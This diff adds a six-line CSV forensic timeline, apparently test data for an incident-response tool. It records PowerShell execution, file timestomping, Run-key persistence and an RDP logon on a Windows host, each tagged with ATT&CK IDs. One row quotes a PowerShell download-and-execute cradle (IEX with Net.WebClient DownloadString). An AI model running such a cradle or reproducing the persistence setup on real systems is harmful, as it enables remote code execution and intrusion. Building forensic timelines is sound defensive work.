@@ -1,0 +1,6 @@
+timestamp,host,artifact_type,action,detail,source_file,attack_techniques
+2026-07-10 08:55:12.0000000,WIN10-BOB,prefetch,process_execution,POWERSHELL.EXE (run_count=14),PECmd_Output.csv,
+2026-07-10 09:00:00.0000000,WIN10-BOB,mft,file_created,"C:/Users/bob/Downloads/report.docx (size=2048) [mft_timestamp_anomaly: SI=2020-01-01 00:00:00.0000000 FN=2026-07-10 09:00:00.0000000]",MFTECmd_$MFT_Output.csv,T1070.006
+2026-07-10 09:02:31.0000000,WIN10-BOB,registry,Run Key,"HKU/S-1-5-21.../Software/Microsoft/Windows/CurrentVersion/Run/Updater = C:/Users/bob/AppData/Roaming/upd.exe",RECmd_Batch_Output.csv,T1547.001
+2026-07-10 09:03:10.0000000,WIN10-BOB,event_log,event_id_4104,"PowerShell ScriptBlock: IEX (New-Object Net.WebClient).DownloadString(...)",EvtxECmd_Output.csv,
+2026-07-10 09:10:45.0000000,WIN10-BOB,event_log,event_id_4624,logon_type_10 from 10.0.0.55 (RDP),EvtxECmd_Output.csv,T1021
